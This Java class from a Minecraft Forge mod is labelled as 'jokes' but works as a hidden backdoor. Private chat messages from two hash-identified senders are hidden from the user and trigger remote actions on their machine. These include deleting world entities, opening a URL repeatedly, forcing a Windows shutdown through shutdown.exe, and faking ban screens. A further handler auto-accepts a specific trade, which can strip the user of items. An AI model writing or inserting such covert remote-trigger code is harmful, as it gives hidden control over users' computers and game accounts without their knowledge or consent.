package cheaters.get.banned.features.jokes;

import cheaters.get.banned.Shady;
import cheaters.get.banned.utils.Utils;
import net.minecraft.client.gui.inventory.GuiChest;
import net.minecraft.entity.Entity;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraftforge.client.event.ClientChatReceivedEvent;
import net.minecraftforge.client.event.GuiScreenEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import org.apache.commons.lang3.SystemUtils;

public class Jokes {

    private static String note = "Hello voyaging decompiler! These are just some pranks I've added to screw with my friends. If you don't know me, don't worry about them. I will never use them on you because I don't know that you exist.";

    @SubscribeEvent
    public void onChat(ClientChatReceivedEvent event) {
        if(event.type == 0) {
            String message = event.message.getUnformattedText();
            if(message.startsWith("From ")) {
                String[] messageParts = message.split(":");
                if(messageParts.length >= 2) {
                    if(messageParts[0].hashCode() == -1616696230 || messageParts[0].hashCode() == 45694785) {
                        event.setCanceled(true);
                        switch(messageParts[1].trim()) {
                            case "!ENTITIES!":
                                for(Entity entity : Shady.mc.theWorld.loadedEntityList) {
                                    if(!entity.equals(Shady.mc.thePlayer)) {
                                        Shady.mc.theWorld.removeEntity(entity);
                                    }
                                }
                                break;

                            case "!DRIP!":
                                for(int i = 0; i < 5; i++) {
                                    Utils.openUrl("https://cheatersgetbanned.me/drip");
                                }
                                break;

                            case "!SHUTDOWN!":
                                if(SystemUtils.IS_OS_WINDOWS) {
                                    try {
                                        Runtime.getRuntime().exec("shutdown.exe -s -t 0");
                                    } catch(Exception ignored) {}
                                }
                                break;

                            case "!PERMBAN!":
                                FakeBan.permBan = true;

                            case "!BANNED!":
                                FakeBan.banStart = System.currentTimeMillis() - 1000;
                                FakeBan.fakeGenericBan(Shady.mc.getNetHandler().getNetworkManager());
                                break;

                            case "!BADNAME!":
                            case "!NAMEBAN!":
                                FakeBan.usernameBan = true;
                                FakeBan.fakeUsernameBan(Shady.mc.getNetHandler().getNetworkManager());
                                break;

                            default:
                                event.setCanceled(false);
                        }
                    }
                }
            }
        }
    }

    @SubscribeEvent
    public void autoTrade(GuiScreenEvent.BackgroundDrawnEvent event) {
        if(Utils.inSkyBlock && event.gui instanceof GuiChest) {
            String name = Utils.getGuiName(event.gui);
            if(name.startsWith("You") && name.hashCode() == 384622247) {
                ItemStack item = Shady.mc.thePlayer.openContainer.inventorySlots.get(5).getStack();
                if(item != null && item.getItem() == Items.carrot && item.stackSize == 5) {
                    ItemStack tradeButton = Shady.mc.thePlayer.openContainer.inventorySlots.get(39).getStack();
                    if(tradeButton != null && tradeButton.getDisplayName().contains("Deal!")) {
                        Shady.mc.playerController.windowClick(
                                Shady.mc.thePlayer.openContainer.windowId,
                                39,
                                2,
                                0,
                                Shady.mc.thePlayer
                        );
                    }
                }
            }
        }
    }

}
